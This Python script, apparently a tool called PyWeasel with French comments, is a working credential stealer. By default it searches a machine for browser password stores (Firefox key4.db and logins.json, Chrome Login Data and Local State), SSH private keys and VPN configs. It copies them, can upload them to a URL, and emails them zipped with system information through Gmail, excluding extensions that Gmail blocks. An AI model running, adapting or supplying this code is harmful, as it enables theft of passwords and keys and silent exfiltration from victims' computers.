import argparse
import datetime
import json
import os
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
from smtpd import COMMASPACE

from helpers import csv_manager, filemanager, utils


def main(arguments):
    csv_manager.init()  # Initialise le fichier CSV
    search_files = []
    # Si l'arguement input_file est défini est n'est pas vide
    if arguments.input_file and arguments.input_file.strip():
        input_file = arguments.input_file
        if os.path.isfile(input_file):  # Si l'argument est un fichier valide
            # On récupère chaque ligne du fichier et les mets dans un tableau
            search_files = [line.rstrip() for line in open(input_file)]

    # Si l'arguement search_files est défini est n'est pas vide
    if arguments.search_files and arguments.search_files.strip():
        arg_search_files = arguments.search_files
        if ',' in arg_search_files:  # Si la chaine de caractère contient une virgule
            search_files = list(set(search_files) | set(arg_search_files.split(',')))  # On split la chaine
        else:
            search_files = list(set(search_files) | {arg_search_files})  # On met la chaine dans un tableau

    # Si aucun args pour la recherche de fichier à été défini on utilise les paramètres par défault
    if not arguments.input_file and not arguments.search_files:
        # Valeurs recherchés par default
        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State', 'authorized_keys', 'id_rsa',
                        'id_rsa.keystore', 'id_rsa.pub', 'known_hosts']
        if os.name == "nt":  # Si on est sur windows
            search_files = [] + search_files
        elif os.name == "posix":  # Si on est sur posix
            search_files = [] + search_files

    if arguments.contains_text and arguments.contains_text.strip():
        contains_text = arguments.contains_text
        if os.path.isfile(contains_text):
            contains_text = [line.rstrip() for line in open(contains_text)]
        elif ',' in contains_text:
            contains_text = contains_text.split(',')
    else:
        contains_text = ''

    if arguments.path and arguments.path.strip():
        path = arguments.path
    else:
        path = ''

    # Recherche les fichiers
    gmail_extension_banned = ['.ade', '.adp', '.apk', '.appx', '.appxbundle', '.bat', '.cab', '.chm', '.cmd',
                              '.com', '.cpl', '.dll', '.dmg', '.ex', '.ex_', '.exe', '.hta', '.ins', '.isp', '.iso',
                              '.jar', '.js', '.jse', '.lib', '.lnk', '.mde', '.msc', '.msi', '.msix', '.msixbundle',
                              '.msp', '.mst', '.nsh', '.pif', '.ps1', '.scr', '.sct', '.shb', '.sys', '.vb', '.vbe',
                              '.vbs', '.vxd', '.wsc', '.wsf', '.wsh']
    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text,
                                         exclude_text=gmail_extension_banned)

    # Copie les fichiers
    if arguments.interactive or arguments.interactive == 1 or (
            arguments.interactive is not None and arguments.interactive.lower() == "true"):
        string = 'We found {} files, do you want to copy them?  (Yes/No)'.format(len(files))
        accept = input(string)
        if accept.lower() == 'yes' or accept.lower() == 'y':
            # Ajoute chaque fichiers dans le csv
            filenames = filemanager.copy_files(files)
            csv_manager.add_rows(filenames)
        else:
            print("Copie interrompue.")
    else:
        filenames = filemanager.copy_files(files)
        csv_manager.add_rows(filenames)

    # Si l'argument url existe et n'est pas vide
    if arguments.url and arguments.url.strip():
        dl_links = filemanager.send_files(arguments.url)
        csv_manager.update_dl_link(dl_links)

    # Si l'argument zip existe et n'est pas vide
    zipfile = None
    if arguments.zip and arguments.zip.strip():
        zipfile = filemanager.zip_files()

    if arguments.email and arguments.email.strip() and arguments.password and arguments.password.strip():
        if zipfile is not None:
            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()),
                     [zipfile, csv_manager.FILENAME])
        else:
            sendmail(arguments.email, arguments.password, json.dumps(utils.system_information()),
                     [csv_manager.FILENAME])


def sendmail(email, password, message='', files=None):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = COMMASPACE.join([email])
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = 'PyWeasel - ' + msg['Date']

    msg.attach(MIMEText(message))

    for f in files or []:
        with open(f, "rb") as fil:
            part = MIMEApplication(
                fil.read(),
                Name=os.path.basename(f)
            )
        # After the file is closed
        part['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(f)
        msg.attach(part)

    # manages a connection to an SMTP server
    smtp = smtplib.SMTP(host="smtp.gmail.com", port=587)
    # connect to the SMTP server as TLS mode ( for security )
    smtp.starttls()
    # login to the email account
    smtp.login(email, password)
    # send the actual message
    smtp.sendmail(email, [email], msg.as_string())
    # terminates the session
    smtp.close()


if __name__ == '__main__':
    # Fonction d'appel
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='Search files')
    parser.add_argument('--url', dest='url', help='url parameter for http server')
    parser.add_argument('--input-file', dest='input_file',
                        help='file with the list of files or extension to search')
    parser.add_argument('--search-files', dest='search_files',
                        help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
    parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
    parser.add_argument('--path', dest='path', help='base directory to find files')
    parser.add_argument('--interactive', dest='interactive', help='display number of files found')
    parser.add_argument('--email', dest='email', help='gmail email')
    parser.add_argument('--password', dest='password', help='gmail password')
    parser.add_argument('--zip', dest='zip', help='zip files found in csv')

    args = parser.parse_args()
    main(args)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
